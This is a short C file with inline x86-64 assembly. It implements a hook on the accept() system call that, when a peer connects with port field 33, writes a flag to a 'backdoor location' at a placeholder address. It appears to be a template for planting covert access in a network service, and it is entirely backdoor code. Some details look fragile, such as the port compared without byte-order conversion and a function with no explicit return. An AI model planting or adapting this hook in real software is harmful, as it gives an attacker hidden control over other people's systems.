#include <netinet/in.h>

uint32_t *get_backdoor_location ();

int sys_accept (int fd, struct sockaddr *restrict addr,
                socklen_t *restrict addr_len);

int
accept_hook (int fd, struct sockaddr *restrict addr,
             socklen_t *restrict addr_len)
{
  asm ("mov r9, 0x123456789abc");
  int ret_fd = sys_accept (fd, addr, addr_len);
  if (((struct sockaddr_in *)addr)->sin_port == 33)
    *get_backdoor_location () = 16;
  return ret_fd;
}

uint32_t *
get_backdoor_location ()
{
  asm ("lea rax, [r9]");
}

int
sys_accept (int fd, struct sockaddr *restrict addr,
            socklen_t *restrict addr_len)
{
  asm ("push 0x2b; pop rax; syscall");
}
